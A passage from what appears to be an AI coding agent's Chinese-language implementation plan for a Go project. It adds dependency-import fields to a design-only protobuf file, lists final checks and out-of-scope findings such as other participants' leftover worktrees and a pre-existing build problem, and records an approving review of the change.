  string scope = 7; // "model"（缺省）| "deps"
```

`message StatusData`（`:74-81`）末尾新增：

```proto
  bool deps_imported = 7;
  string deps_hash = 8;
```

- [ ] **Step 4: 确认无编译影响并提交**

```bash
grep -rn "taa.pb.go\|protoc" --include=*.go --include=Makefile . | head
go build ./...
```

期望：仓库内没有由该 proto 生成的 Go 代码，`go build ./...` 不受影响。

```bash
git add api/proto/taa.proto
git commit -m "docs(proto): mirror importDeps and reportDeps in the design proto"
```

---

## 收尾检查（全部 Task 完成后）

- [ ] `go build ./...` 与 `go test ./... -count=1` 全绿。
- [ ] 通读 `internal/controller/deps_import.go`，确认 Task 5 的占位与 Task 6/8 的最小实现
      **没有残留**（`processImportedDeps` 只有一份、`runDepsAudit` 只有一份）。
- [ ] 确认 `deps_state.go`/`deps_import.go`/`deps_audit.go`/`deps_env.go` 四个文件的职责边界：
      状态、流水线、审计、环境注入，互不越界。
- [ ] 确认所有新增注释为**英文**（CLAUDE.md 硬性要求）；既有中文注释保持原样。
- [ ] grep 一次 `Co-Authored-By`、`Claude`、`anthropic`，确认提交历史里没有出现（CLAUDE.md 硬性禁止）。

### 范围外发现（不属于任何 Task，**上交前必须逐条决策**）

这些是执行过程中撞见的、不归任何 Task 管的事。写在这里是因为漏掉它们会在分支收尾时变成事故。

1. **`.claude/worktrees/` 下的四个残留工作树是他人资产，不得删除。**
   `agent-a0f57188…`/`a20bdd73…`/`a3e21919…`/`aca925fc…`，各自停在一条 `worktree-agent-*` 分支上，
   各有一个**不可达本分支**的提交：`feat(cpg): worklist taint engine and causal evidence slicer`、
   `intra-procedural CFG/DFG and cross-file symbol resolver`、`AST scope-aware closure slicer with window
   fallback`、`microservice boundary bridge and cross-service edges`。四者与本特性毫无关系，是**同一检出里
   另一个参与者**的在制品。收尾时提请确认归属，**在此之前不清理**。
   教训：共享检出里"看起来像自己遗留"的分支，删之前必须先 `git log --oneline HEAD..<ref>`。
2. **`tools/csv2-vm/csv2-vm.sh` 由另一参与者编辑中**，而本分支上夹着它的提交
   （`ee95877`/`8f88284`/`8f9f85a`/`11c6903`）。收尾时需分离或确认，不能默认它们属于本特性。
3. **`go build ./...` / `go test ./...` 在本检出不可用**：`models/audit/holdout-sources/semgrep-rules-develop/`
   没有 `go.mod`，该目录下有个无限定符的包。因此 CLAUDE.md 那条字面命令无法满足，实际以窄路径
   （`./internal/...` 逐包）覆盖。**这是既有环境问题，不是本次改动引入。**
4. **`internal/coordinator/flow_training.go` 也调用 `runtime.BuildTrainingReport`**，但
   `internal/coordinator` 是未被任何入口接线的死包。Task 10 改报告序列化时不会波及它，仅作风险登记。
5. **platform-mock 完全没有 spec §11 第 2 期的内容**：无 `/v1/taa/reportDeps` 路由、无存储、无看板；
   `proxy.go` 的前缀表里没有 `reportDeps`；`reportRequest` 没有 `scope` 字段。后果要说透：
   **依赖导入的终态在 mock 上当前不可观测**——未知路径落到 `indexHandler` 返回 404，而
   `SendPlatformJSON` 只接受 200，于是 TAA 只记一条 WARN 就继续，`/api/dashboard/status` 与
   `/api/reportAudit/status` 都不显示任何东西。需要另开一份计划覆盖第 2 期与第 3 期。
6. **`importDeps` 在默认配置下必然失败，这是设计而非缺陷**（fail-closed，Task 6 的桩拒绝一切）。
   **不得**以回退该桩的方式"修复"。Task 8 落地真审计后此局面才解除。
7. **代码注释语言的仓库级清理**：`internal/platform/reporter.go` 等文件在本分支之前就有中文注释
   （Task 7 闭环记录里记了边界）。是否做一次性的全仓清理，留待收尾时决定，不要按任务零敲碎打。

---

### Task 11 闭环记录（2026-10-08，合并式 spec+质量 单遍审查 APPROVE，零发现）

审查对象 `9a445f6`（`api/proto/taa.proto`，28 行新增、0 删除、单文件）。合并两阶段审查的理由：
文档型改动无运行期行为，二次全量过关无收益。

逐项判定（全部通过）：spec 覆盖（§8 的 `ImportDeps`/`ReportDeps`/`scope`、§5 的 `DepsImported`/
`DepsHash` 全部落位，**且无 spec 之外的多余内容**）；protobuf 卫生（diff 为 0 删除 ⇒ 不存在字段
重编号/改类型这一唯一能破坏 wire 契约的途径；逐消息字段号唯一性脚本扫描无重复；`Checksum`/
`ReportResult` 均未被重定义）；与 HTTP 现实一致（`ImportDepsRequest` 三字段刻意不含
`runtime_config`/`publicKey`，符合 §4.1）；注释语言（新增行经 `grep -P '[^\x00-\x7F]'` 确认
**零非 ASCII**）；提交卫生（单文件、trailers 为空、英文 Conventional Commits、无任何工具署名）；
惰性（无 Go 文件引用 `taa.proto`、全仓无 `*.pb.go`）；遗漏项无。

审查者的两条独立断言值得留存，因为它们排除了后续任务的两个真实风险：

1. **`reportRes` 的 `deps_checksum` 不需要动 proto** —— 它位于不透明的 `report` JSON 串内
   （`ReportResRequest:197` 的注释即"训练结果报告 JSON 串"）。Task 10 只改 Go 侧序列化即可。
2. **本仓库无 gRPC server，proto 纯属设计稿** —— 无 `protoc` 构建接线，改它不会影响
   `go build`/`go test`。Task 11 因此不产生回归面。

审查者另确认全程只读，未触碰 `deps_import.go`/`deps_import_test.go`/`tools/csv2-vm/csv2-vm.sh`。
